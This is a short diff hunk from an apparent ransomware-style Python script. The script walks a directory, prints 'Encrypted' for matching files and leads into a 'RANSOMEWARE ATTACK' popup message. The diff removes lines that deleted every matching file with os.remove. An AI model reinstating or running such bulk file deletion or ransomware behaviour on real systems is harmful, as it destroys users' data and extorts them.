@@ -39,8 +39,6 @@ for root, dirs, files in os.walk(directory_path):
         if file_ext in allowed and file_ext:
             print(f"File '{file_path}' Encrypted.")
             time.sleep(1)
-            os.remove(file_path)
-            print(f"File '{file_path}' Deleted.")
 
 # Ransomware Popup
 message_text = "RANSOMEWARE ATTACK ----- RANSOMEWARE ATTACK ----- RANSOMEWARE ATTACK"
